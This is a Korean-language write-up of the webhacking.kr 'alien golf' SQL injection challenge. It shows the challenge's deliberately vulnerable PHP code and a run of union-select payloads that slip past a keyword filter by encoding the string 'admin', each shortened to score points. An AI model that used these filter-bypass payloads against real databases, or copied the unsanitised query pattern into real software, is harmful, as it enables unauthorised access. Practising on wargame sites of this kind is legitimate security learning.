---
title: ["[Webhacking.kr] alien golf (sqli - ???)"]
date: 2024-12-10 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, sqli, golf]
---

```php
<?php
  include "../../config.php";
  login_chk();
  $db = dbconnect();
  print_best_golfer(72);
  $db = dbconnect("alien");
  if(preg_match('/admin|if/i', $_GET['no'])) exit("No Hack ~_~");
  $query = "select id from prob_alien where no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
  if($_GET['no']){
    $r = mysqli_fetch_array(mysqli_query($db,$query));
    if($r['id'] !== "admin") exit("sandbox1");
    $r = mysqli_fetch_array(mysqli_query($db,$query));
    if($r['id'] === "admin") exit("sandbox2");
    $r = mysqli_fetch_array(mysqli_query($db,$query2));
    if($r['id'] === "admin") exit("sandbox");
    $r = mysqli_fetch_array(mysqli_query($db,$query2));
    if($r['id'] === "admin"){
      // !!THIS IS PAYLOAD GOLF CHALLENGE!!
      // My solution of alien golf is 140byte.
      // If your solution is shorter than mine, you will get 5 point per 1 byte.
      $len = 140 - strlen($_GET['no']);
      if($len > 0){
        solve(72,$len * 5);
      }
      else{
        echo "<h2>nice try :)</h2>";
      }
    }
  }
  highlight_file(__FILE__);
?>
```

Lord of SQLi의 Alien과 같은 문제이다.  
Golf 형식의 문제로 페이로드가 짧을수록 높은 점수를 받게 된다.  

최고득점이 510 point니까 누군가는 이걸 38byte만에 해결했다는 뜻이다.  

```sql
?no=0 union select substr(0x61646d696e,now()%2,5)%23' union select substr(0x61646d696e,now()%2+1,5)%23 union select sleep(1)%23
```
Alien을 풀 때 사용했던 페이로드를 최대한 줄여보자.  

Alien은 문제를 확실히 푸는게 중요했어서 time값과 sleep으로 50%의 확률로 문제를 풀 수 있게 했지만, 이번 문제는 페이로드를 짧게하는 것이 가장 중요한 목표이므로 rand를 사용한 접근을 해보았다.  
또한 substr을 mid로 바꿨다.  

```sql
?no=0 union select mid(0x61646d696e,rand(),5)%23'union select mid(0x61646d696e,rand(),5)%23
?no=0 union select mid(@a:=0x61646d606e,rand(),5)%23'union select mid(@a,rand(),5)%23
?no=0 union select mid(@a:="admi" "n",rand(),5)%23'union select mid(@a,rand(),5)%23
```

1/16 확률로 동작하는 페이로드로 75byte까지는 줄였다. 325point 획득.  

좀 더 줄일 수 있을 것 같은데, 고민을 더 해보자.  